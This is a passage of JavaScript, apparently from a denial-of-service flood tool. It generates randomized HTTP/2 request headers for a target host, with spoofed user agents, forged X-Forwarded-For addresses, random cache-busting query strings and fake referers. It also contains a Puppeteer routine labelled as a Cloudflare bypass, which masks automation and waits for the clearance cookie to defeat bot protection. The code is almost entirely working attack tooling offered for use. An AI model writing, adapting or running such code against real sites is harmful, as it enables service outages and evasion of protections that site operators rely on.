        duckduckgo: Math.random() < 0.5 ? "macOS" : Math.random() < 0.5 ? "Windows" : "Linux"
    };
    const platform = platforms[browser];

    const userAgents = {
        chrome: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64; rv:${Math.floor(100 + Math.random() * 20)}.0) Gecko/20100101 Firefox/${Math.floor(100 + Math.random() * 20)}.${Math.floor(Math.random() * 50)}.0`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X ${["10_15_7", "13_0", "14_0"][Math.floor(Math.random() * 3)]}) AppleWebKit/${Math.floor(537 + Math.random() * 10)}.36 (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 4)}.0 Safari/${Math.floor(537 + Math.random() * 10)}.36`,
        opera: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36 OPR/${Math.floor(95 + Math.random() * 10)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 5)}`,
        operagx: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36 OPR/${Math.floor(95 + Math.random() * 10)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 5)} (Edition GX)`,
        brave: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36 Brave/${Math.floor(1 + Math.random() * 4)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 500)}.${Math.floor(Math.random() * 5)}`,
        mobile: `Mozilla/5.0 (Linux; Android ${Math.floor(11 + Math.random() * 4)}; ${Math.random() < 0.5 ? "Mobile" : "Tablet"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Mobile Safari/537.36`,
        duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X ${["10_15_7", "13_0", "14_0"][Math.floor(Math.random() * 3)]}) AppleWebKit/${Math.floor(537 + Math.random() * 10)}.36 (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 4)}.0 DuckDuckGo/7 Safari/${Math.floor(537 + Math.random() * 10)}.36`
    };
    
    const secFetchUser = Math.random() < 0.75 ? "?1;?1" : "?1";
    const secChUaMobile = browser === "mobile" ? "?1" : "?0";
    const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
    const accept = Math.random() < 0.5 
      ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
      : "application/json";

    const secChUaPlatform = ["Windows", "Linux", "macOS"][Math.floor(Math.random() * 3)];
    const secChUaFull = Math.random() < 0.5 
      ? `"Google Chrome";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`
      : `"Mozilla Firefox";v="${Math.floor(115 + Math.random() * 10)}"`;

    const secFetchDest = ["document", "image", "empty", "frame"][Math.floor(Math.random() * 4)];
    const secFetchMode = ["navigate", "cors", "no-cors"][Math.floor(Math.random() * 3)];
    const secFetchSite = ["same-origin", "same-site", "cross-site", "none"][Math.floor(Math.random() * 4)];

    const acceptLanguage = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "es-ES,es;q=0.8", "fr-FR,fr;q=0.8", "id-ID,id;q=0.9"][Math.floor(Math.random() * 5)];

    const acceptCharset = Math.random() < 0.5 ? "UTF-8" : "ISO-8859-1";
    const connection = Math.random() < 0.5 ? "keep-alive" : "close";
    const xRequestedWith = Math.random() < 0.5 ? "XMLHttpRequest" : "Fetch";
    const referer = ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://www.bing.com/ ", "https://www.facebook.com/ ", "https://www.reddit.com/ ", "https://twitter.com/ "][Math.floor(Math.random() * 6)];

    const xForwardedFor = Math.random() < 0.5 
      ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
      : `2001:db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`;

    const te = Math.random() < 0.5 ? "trailers" : "gzip";
    const cacheControl = Math.random() < 0.5 ? "no-cache" : "max-age=3600";

    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(5, 10) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Brave";v="${Math.floor(99 + Math.random() * 6)}", "Chromium";v="${Math.floor(119 + Math.random() * 6)}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(99 + Math.random() * 6)}.0.0.0`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://store.steampowered.com/ ", "https://www.epicgames.com/ ", "https://www.twitch.tv/ ", "https://discord.com/ ", "https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://developer.mozilla.org ", "https://m.youtube.com ", "https://www.opera.com ", "https://www.youtube.com/ ", "https://twitter.com/ ", "https://www.instagram.com/ "][Math.floor(Math.random() * 12)],
            "origin": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://developer.mozilla.org ", "https://m.youtube.com ", "https://www.opera.com ", "https://discord.com ", "https://store.steampowered.com ", "https://www.twitch.tv "][Math.floor(Math.random() * 8)],
            "x-forwarded-for": xForwardedFor,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
        },
        chrome: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.4 ? "." : "") 
                : (Math.random() < 0.4 ? "www." : "") + parsedTarget.host + (Math.random() < 0.4 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(5, 10) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": ["Windows", "Android", "macOS", "Linux"][Math.floor(Math.random() * 4)],
            "sec-ch-ua-platform-version": ["10.0.0", "11.0.0", "12.0.0", "13.0.0", "14.0.0", "15.0.0"][Math.floor(Math.random() * 6)],
            "user-agent": Math.random() < 0.5 
                ? `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`
                : `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 5)}; ${Math.random() < 0.5 ? "Pixel" : "Samsung"} ${Math.floor(3 + Math.random() * 3)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Mobile Safari/537.36`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.8", "de-DE,de;q=0.7", "zh-CN,zh;q=0.8"][Math.floor(Math.random() * 6)],
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br, lz4",
            "referer": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://www.bing.com/ ", "https://duckduckgo.com/ ", "https://www.facebook.com/ ", "https://twitter.com/ ", "https://news.ycombinator.com/ ", "https://reddit.com/ ", "https://www.linkedin.com/ ", "https://www.quora.com/ ", "https://www.medium.com/ ", "https://www.github.com/ "][Math.floor(Math.random() * 12)],
            "x-forwarded-for": xForwardedFor,
            "sec-fetch-dest": ["document", "image", "iframe", "script", "empty"][Math.floor(Math.random() * 5)],
            "sec-fetch-mode": ["navigate", "cors", "no-cors", "same-origin"][Math.floor(Math.random() * 4)],
            "sec-fetch-site": ["same-origin", "same-site", "cross-site", "none"][Math.floor(Math.random() * 4)],
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
        },
        firefox: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(5, 10) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Mozilla Firefox";v="${Math.floor(115 + Math.random() * 10)}"`,
            "sec-ch-ua-mobile": Math.random() < 0.3 ? "?1" : "?0",
            "sec-ch-ua-platform": ["Windows", "Linux", "Android", "Macintosh"][Math.floor(Math.random() * 4)],
            "sec-ch-ua-platform-version": (() => {
                let platform = ["Windows", "Linux", "Android", "Macintosh"][Math.floor(Math.random() * 4)];
                if (platform === "Windows") return `"${Math.random() < 0.5 ? '10.0' : '11.0'}"`;
                if (platform === "Macintosh") return `"${Math.random() < 0.5 ? '10.15.7' : '11.6'}"`;
                if (platform === "Android") return `"${Math.random() < 0.5 ? '12.0' : '13.0'}"`;
                return undefined;
            })(),
            "user-agent": Math.random() < 0.5 
                ? `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64; rv:${Math.floor(115 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(115 + Math.random() * 10)}.0`
                : `Mozilla/5.0 (X11; Linux x86_64; rv:${Math.floor(115 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(115 + Math.random() * 10)}.0`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7", "de-DE,de;q=0.8"][Math.floor(Math.random() * 5)],
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://m.youtube.com/ ", "https://www.reddit.com/ ", "https://github.com/ ", "https://stackoverflow.com/ ", "https://www.wikipedia.org/ ", "https://news.ycombinator.com/ ", "https://www.instagram.com/ ", "https://www.tiktok.com/ "][Math.floor(Math.random() * 10)],
            "origin": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://developer.mozilla.org ", "https://github.com ", "https://www.reddit.com ", "https://www.twitter.com "][Math.floor(Math.random() * 6)],
            "x-forwarded-for": xForwardedFor,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": ["same-origin", "same-site", "cross-site"][Math.floor(Math.random() * 3)],
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
        },
        mobile: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.3 ? "." : "") 
                : (Math.random() < 0.3 ? "m." : "www.") + parsedTarget.host + (Math.random() < 0.3 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(5, 10) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Chromium";v="${Math.floor(114 + Math.random() * 9)}", "Google Chrome";v="${Math.floor(114 + Math.random() * 9)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua-platform-version": `"${Math.floor(10 + Math.random() * 4)}.0"`,
            "user-agent": Math.random() < 0.5 
                ? `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 4)}.0; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(114 + Math.random() * 9)}.0.${Math.floor(5000 + Math.random() * 4000)}.0 Mobile Safari/537.36`
                : `Mozilla/5.0 (Android ${Math.floor(10 + Math.random() * 4)}.0; Mobile; rv:${Math.floor(115 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(115 + Math.random() * 10)}.0`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7"][Math.floor(Math.random() * 4)],
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://m.youtube.com/ ", "https://www.tiktok.com/ ", "https://m.facebook.com/ ", "https://mobile.twitter.com/ ", "https://m.instagram.com/ ", "https://m.wikipedia.org/ ", "https://www.reddit.com/r/all/ ", "https://www.quora.com/ "][Math.floor(Math.random() * 10)],
            "origin": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://developer.mozilla.org ", "https://m.youtube.com ", "https://www.tiktok.com ", "https://m.facebook.com "][Math.floor(Math.random() * 6)],
            "x-forwarded-for": xForwardedFor,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": ["same-origin", "same-site", "cross-site"][Math.floor(Math.random() * 3)],
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
        },
        opera: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(5, 10) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Opera";v="${Math.floor(95 + Math.random() * 10)}", "Chromium";v="${Math.floor(119 + Math.random() * 6)}"`,
            "sec-ch-ua-mobile": Math.random() < 0.3 ? "?1" : "?0",
            "sec-ch-ua-platform": ["Windows", "Linux", "Android", "Macintosh"][Math.floor(Math.random() * 4)],
            "sec-ch-ua-platform-version": (() => {
                let platform = ["Windows", "Linux", "Android", "Macintosh"][Math.floor(Math.random() * 4)];
                if (platform === "Windows") return `"${Math.random() < 0.5 ? '10.0' : '11.0'}"`;
                if (platform === "Macintosh") return `"${Math.random() < 0.5 ? '10.15.7' : '11.6'}"`;
                if (platform === "Android") return `"${Math.random() < 0.5 ? '12.0' : '13.0'}"`;
                return undefined;
            })(),
            "user-agent": Math.random() < 0.5 
                ? `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(95 + Math.random() * 10)}.0.0.0`
                : `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(95 + Math.random() * 10)}.0.0.0`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.7", "de-DE,de;q=0.8"][Math.floor(Math.random() * 5)],
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://m.youtube.com/ ", "https://www.reddit.com/ ", "https://github.com/ ", "https://stackoverflow.com/ ", "https://www.wikipedia.org/ ", "https://news.ycombinator.com/ ", "https://www.instagram.com/ ", "https://www.tiktok.com/ "][Math.floor(Math.random() * 10)],
            "origin": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://developer.mozilla.org ", "https://m.youtube.com ", "https://www.opera.com ", "https://github.com ", "https://www.reddit.com ", "https://www.bbc.com "][Math.floor(Math.random() * 8)],
            "x-forwarded-for": xForwardedFor,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": ["same-origin", "same-site", "cross-site"][Math.floor(Math.random() * 3)],
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
        },
        operagx: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(5, 10) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Opera GX";v="${Math.floor(99 + Math.random() * 6)}", "Chromium";v="${Math.floor(119 + Math.random() * 6)}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(99 + Math.random() * 6)}.0.0.0 GX`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://store.steampowered.com/ ", "https://www.epicgames.com/ ", "https://www.twitch.tv/ ", "https://discord.com/ ", "https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://developer.mozilla.org ", "https://m.youtube.com ", "https://www.opera.com ", "https://www.youtube.com/ ", "https://twitter.com/ ", "https://www.instagram.com/ "][Math.floor(Math.random() * 13)],
            "origin": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://developer.mozilla.org ", "https://m.youtube.com ", "https://www.opera.com ", "https://discord.com ", "https://store.steampowered.com ", "https://www.twitch.tv "][Math.floor(Math.random() * 8)],
            "x-forwarded-for": xForwardedFor,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
        },
        duckduckgo: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(5, 10) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"DuckDuckGo";v="${Math.floor(10 + Math.random() * 5)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": "Windows",
            "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 DuckDuckGo/${Math.floor(10 + Math.random() * 5)}.0`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://store.steampowered.com/ ", "https://www.epicgames.com/ ", "https://www.twitch.tv/ ", "https://discord.com/ ", "https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://developer.mozilla.org ", "https://m.youtube.com ", "https://www.opera.com ", "https://www.youtube.com/ ", "https://twitter.com/ ", "https://www.instagram.com/ "][Math.floor(Math.random() * 13)],
            "origin": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://developer.mozilla.org ", "https://m.youtube.com ", "https://www.opera.com ", "https://discord.com ", "https://store.steampowered.com ", "https://www.twitch.tv "][Math.floor(Math.random() * 8)],
            "x-forwarded-for": xForwardedFor,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
        },
        safari: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.3 ? "." : "") 
                : (Math.random() < 0.3 ? "www." : "") + parsedTarget.host + (Math.random() < 0.3 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(5, 10) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"AppleWebKit";v="${Math.floor(537 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": ["macOS", "iOS"][Math.floor(Math.random() * 2)],
            "sec-ch-ua-platform-version": ["14.0.0", "15.2.0", "16.6.1", "17.2.0"][Math.floor(Math.random() * 4)],
            "user-agent": Math.random() < 0.5 
                ? `Mozilla/5.0 (Macintosh; Intel Mac OS X ${["10_15_7", "13_0", "14_0"][Math.floor(Math.random() * 3)]}) AppleWebKit/${Math.floor(537 + Math.random() * 10)}.36 (KHTML, like Gecko) Version/${Math.floor(15 + Math.random() * 5)}.0 Safari/${Math.floor(537 + Math.random() * 10)}.36`
                : `Mozilla/5.0 (iPhone; CPU iPhone OS ${["16_6_1", "17_2"][Math.floor(Math.random() * 2)]} like Mac OS X) AppleWebKit/${Math.floor(537 + Math.random() * 10)}.36 (KHTML, like Gecko) Version/${Math.floor(15 + Math.random() * 5)}.0 Mobile/${Math.floor(1500 + Math.random() * 500)} Safari/${Math.floor(537 + Math.random() * 10)}.36`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8"][Math.floor(Math.random() * 3)],
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://dns.nextdns.io/35e746 ", "https://35e746.dns.nextdns.io ", "https://www.google.com/ ", "https://www.apple.com/ ", "https://www.bing.com/ ", "https://duckduckgo.com/ ", "https://twitter.com/ ", "https://developer.apple.com/ ", "https://support.apple.com/ ", "https://news.ycombinator.com/ "][Math.floor(Math.random() * 9)],
            "origin": ["https://www.apple.com ", "https://support.apple.com ", "https://developer.apple.com "][Math.floor(Math.random() * 3)],
            "x-forwarded-for": Math.random() < 0.5 
                ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
                : `2001:0db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": ["same-origin", "same-site", "cross-site"][Math.floor(Math.random() * 3)],
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
        }
    };

    return headersMap[browser];
};

// --- CLOUDFLARE BYPASS FUNCTIONS (PUPPETEER) ---
async function bypassCloudflareOnce(attemptNum = 1) {
    let response = null;
    let browser = null;
    let page = null;
    
    try {
        response = await connect({
            headless: false,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--disable-gpu',
                '--window-size=1920,1080'
            ],
            turnstile: true,
            connectOption: {
                defaultViewport: null
            }
        });
        
        browser = response.browser;
        page = response.page;
        
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
        });
        
        try {
            await page.goto(args.target, { 
                waitUntil: 'domcontentloaded',
                timeout: 60000 
            });
        } catch (navError) {
        }
        
        let challengeCompleted = false;
        let checkCount = 0;
        const maxChecks = 120;
        
        while (!challengeCompleted && checkCount < maxChecks) {
            await new Promise(r => setTimeout(r, 500));
            
            try {
                const cookies = await page.cookies();
                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                
                if (cfClearance) {
                    challengeCompleted = true;
                    break;
                }
                
                challengeCompleted = await page.evaluate(() => {
                    const title = (document.title || "").toLowerCase();
                    const bodyText = (document.body?.innerText || "").toLowerCase();
                    
                    if (title.includes("just a moment") || 
                        title.includes("checking") ||
                        bodyText.includes("checking your browser") ||
                        bodyText.includes("please wait") ||
                        bodyText.includes("cloudflare")) {
                        return false;
                    }
                    
                    return document.body && document.body.children.length > 3;
                });
                
            } catch (evalError) {
            }
            
            checkCount++;
        }
        
